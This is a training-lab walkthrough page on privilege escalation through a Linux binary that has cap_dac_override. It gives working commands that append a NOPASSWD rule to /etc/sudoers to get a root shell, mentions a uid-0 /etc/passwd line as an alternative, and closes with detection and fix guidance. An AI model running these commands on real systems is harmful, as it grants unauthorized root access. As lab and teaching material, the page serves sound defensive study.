# C05 · Station D — cap_dac_override on a writer · ★★★☆

> **Chapter:** [[Chapter-05-Overview]] · **Next:** [[C05-Station-E-cap_setuid-launcher]]
> **Host:** `hollow-vault-01` (`target-caps`) · **Binary:** `/usr/local/bin/vault-write`
> **The bug:** a "config writer" carries `cap_dac_override=ep` — write any file.

---

## 1. Exploit — do this first

```bash
echo 'labuser1 ALL=(ALL) NOPASSWD:ALL' | vault-write /etc/sudoers
sudo -n bash          # or: sudo -n cat /root/flag.txt
```

`vault-write <path>` appends your stdin to a file, bypassing the write check.

---

## 2. How you find it

```bash
getcap -r / 2>/dev/null | grep dac_override
# /usr/local/bin/vault-write cap_dac_override=ep
```
`vault-write /tmp/test` on a file you own shows the behaviour; then aim at root's.

## 3. Why it works

`CAP_DAC_OVERRIDE` waives read/write/execute permission checks. The catch: a
**new** file is owned by *you*, and sudo rejects drop-files in `sudoers.d` it
doesn't own as root. So append to a file that is **already** root-owned —
`/etc/sudoers` exists, `root:root 0440`. Appending keeps the owner and mode, so
sudo trusts your added NOPASSWD line. (`/etc/passwd` with a uid-0 line works the
same way.)

## 4. Pitfalls

- **Don't create a new sudoers.d file** — wrong owner, sudo ignores it. Append to existing root-owned `/etc/sudoers`.
- `vault-write` appends (doesn't truncate), so you won't destroy `/etc/sudoers`.

## 5. Detect & fix

- **Detect:** `getcap -r / | grep dac_override`; `auditctl -w /etc/sudoers -p wa`.
- **Fix:** remove the capability; a tool that edits one file should get group ownership of that file, not a write-any-file capability. [[Blue-Team-Playbook]].

## 6. What you learned

- `cap_dac_override` = arbitrary file write. Target an existing root file so ownership stays root.
- Same root cause as writable `/etc/sudoers` / `/etc/passwd`, reached via a capability.

> Next: [[C05-Station-E-cap_setuid-launcher]] · Related: [[C03-Station-B-Writable-Sudo-Script]]
